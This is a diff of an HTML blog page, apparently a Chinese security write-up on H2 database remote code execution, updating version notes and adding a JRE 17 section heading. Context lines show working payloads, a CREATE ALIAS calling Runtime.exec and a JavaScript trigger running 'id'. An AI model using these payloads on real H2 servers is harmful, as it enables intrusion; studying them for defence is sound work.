@@ -254,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          1.5k 字
         
       </span>
     
@@ -265,7 +265,7 @@
         
         
         
-          12 分钟
+          13 分钟
         
       </span>
     
@@ -346,7 +346,7 @@ spring.h2.console.settings.web-allow-others&#x3D;true<span aria-hidden="true" cl
 <figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">CREATE</span> <span class="token constant">ALIAS</span> <span class="token constant">EXEC</span> <span class="token constant">AS</span> '<span class="token class-name">String</span> <span class="token function">rce</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span> <span class="token punctuation">&#123;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>'<span class="token punctuation">;</span>
 <span class="token class-name">CALL</span> <span class="token constant">EXEC</span> <span class="token punctuation">(</span>'<span class="token keyword">open</span> <span class="token operator">-</span>a <span class="token class-name">Calculator</span><span class="token punctuation">.</span>app'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>
 
-<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>当目标Java版本较低（Java 15 以后 Java 自带的 Nashorn JavaScript 引擎被删除），可通过 JavaScript 方法RCE：</p>
+<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>当目标Java版本较低（Java8-Java14，Java 15 以后 Java 自带的 Nashorn JavaScript 引擎被删除），可通过 JavaScript 方法RCE：</p>
 <figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> shell3 BEFORE <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">AS</span> $$<span class="token comment">//javascript</span>
     var <span class="token operator">is</span> <span class="token operator">=</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span>
     var scanner <span class="token operator">=</span> new java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">(</span><span class="token operator">is</span><span class="token punctuation">)</span><span class="token punctuation">.</span>useDelimiter<span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span>
@@ -417,7 +417,9 @@ $$;AUTHZPWD&#x3D;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>
 
 <p>也就是说，我们可以修改默认的 <code>Driver Class</code> 为<code>javax.naming.Context</code>，从而实现JNDI注入。</p>
-<p>后续JNDI注入的问题在<code>2.0.206</code>中被修复。</p>
+<p>后续Web控制台页面上的JNDI注入的问题在<code>2.0.206</code>中被修复，仅仅允许java:开头</p>
+<h1 id="H2-RCE-在-JRE-17-环境下的利用"><a href="#H2-RCE-在-JRE-17-环境下的利用" class="headerlink" title="H2 RCE 在 JRE 17 环境下的利用"></a>H2 RCE 在 JRE 17 环境下的利用</h1><p>前置相关知识取自这个师傅的<a target="_blank" rel="noopener" href="https://exp10it.io/2025/03/h2-rce-in-jre-17/">连接</a>：</p>
+<p>这里直接列出相关方法：</p>
 <h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul>
 <li><a target="_blank" rel="noopener" href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45506">https://www.exploit-db.com/exploits/45506</a></li>
@@ -526,8 +528,8 @@ $$;AUTHZPWD&#x3D;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/10/%E6%9D%82/MacOS%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" title="MacOS使用技巧">
-                        <span class="hidden-mobile">MacOS使用技巧</span>
+                      <a href="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/" title="2025 Gogs 远程命令执行(CVE-2024-56731)">
+                        <span class="hidden-mobile">2025 Gogs 远程命令执行(CVE-2024-56731)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
